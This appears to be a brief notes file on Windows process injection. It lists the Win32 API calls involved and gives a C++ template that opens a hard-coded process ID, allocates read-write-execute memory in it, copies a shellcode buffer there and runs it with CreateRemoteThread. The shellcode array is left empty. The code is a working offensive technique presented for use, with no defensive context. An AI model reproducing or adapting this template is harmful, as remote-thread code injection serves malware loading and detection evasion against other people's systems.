# Windows 
### Injection and Hijacking

### Win APi Functions

OpenProcess 

VirtualAllocEx 

WriteProcessMemory


### Inject thread 


```cpp
#include <windows.h>
#include <processthreadsapi.h>

int main() {

    HANDLE hProcess, hThread;
    LPVOID start_ptr;
    DWORD tid;
    size_t written;

    char shellcode[] = {

    };
    start_ptr = (LPVOID) 0x13370000;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2676);

    start_ptr = VirtualAllocEx(hProcess, start_ptr, 0x1000,  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hProcess, start_ptr, shellcode, 256, &written);

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)start_ptr, NULL, 0, &tid);

}

```
